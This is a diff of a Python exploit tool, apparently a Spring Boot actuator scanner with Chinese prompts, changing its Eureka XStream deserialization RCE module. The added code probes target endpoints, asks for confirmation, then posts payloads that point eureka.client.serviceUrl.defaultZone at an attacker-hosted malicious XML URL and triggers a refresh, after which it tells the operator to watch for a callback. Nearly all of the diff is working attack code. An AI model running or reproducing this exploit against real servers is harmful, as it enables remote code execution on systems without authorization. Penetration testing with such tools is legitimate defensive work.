@@ -432,32 +432,41 @@ def Eureka_xstream_RCE(url, proxies, header_new):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.post(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
-
-        if ('127.0.0.2' in str(re1.text)):
-            cprint("[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring 1.x", "red")
-            EvilUrl = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ")
-            EvilUrl = EvilUrl.strip()
-            payload_1 = "eureka.client.serviceUrl.defaultZone=" + EvilUrl
-            re1 = requests.post(url=urltest1, headers=Headers_1, timeout=outtime, data=payload_1, allow_redirects=False,
-                                verify=False, proxies=proxies)
-            requests.post(url=url_refresh_1, timeout=outtime, allow_redirects=False, verify=False, proxies=proxies)
-            cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
-
-
-        elif ('127.0.0.2' in str(re2.text)):
-            cprint("[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring 2.x", "red")
-            EvilUrl = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ")
-            EvilUrl = EvilUrl.strip()
-            payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"" + EvilUrl + "\"}"
-            re2 = requests.post(url=urltest2, headers=Headers_2, timeout=outtime, data=payload_2, allow_redirects=False,
-                                verify=False, proxies=proxies)
-            requests.post(url=url_refresh_2, timeout=outtime, allow_redirects=False, verify=False, proxies=proxies)
-            cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
-
+        re1 = requests.get(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.get(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+        if ('eureka.client.serviceUrl.defaultZone' in str(re1.text)) or ('eureka.client.serviceUrl.defaultZone' in str(re2.text)):
+            selectd = input("\n[+] 可能存在Eureka_Xstream反序列化漏洞，因该漏洞可能会破坏业务，是否要发送Exploit（Y/N）: ")
+            if selectd == '':
+                selectd = "N"
+                cprint("[.] 已经手动取消发送该Exploit\n", "yellow")
         else:
-            cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
+            cprint("[-] 未发现Eureka_Xstream反序列化漏洞1\n", "yellow")
+            selectd = "N"
+            
+        if selectd == "Y":
+            re3 = requests.post(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+            re4 = requests.post(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+
+            if ('127.0.0.2' in str(re3.text)):
+                cprint("[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring 1.x", "red")
+                EvilUrl = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ")
+                EvilUrl = EvilUrl.strip()
+                payload_1 = "eureka.client.serviceUrl.defaultZone=" + EvilUrl
+                re1 = requests.post(url=urltest1, headers=Headers_1, timeout=outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+                requests.post(url=url_refresh_1, timeout=outtime, allow_redirects=False, verify=False, proxies=proxies)
+                cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
+
+            elif ('127.0.0.2' in str(re4.text)):
+                cprint("[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring 2.x", "red")
+                EvilUrl = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ")
+                EvilUrl = EvilUrl.strip()
+                payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"" + EvilUrl + "\"}"
+                re2 = requests.post(url=urltest2, headers=Headers_2, timeout=outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+                requests.post(url=url_refresh_2, timeout=outtime, allow_redirects=False, verify=False, proxies=proxies)
+                cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
+
+            else:
+                cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -926,4 +935,5 @@ def vul(url, proxies, header_new):
             break
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
+
 
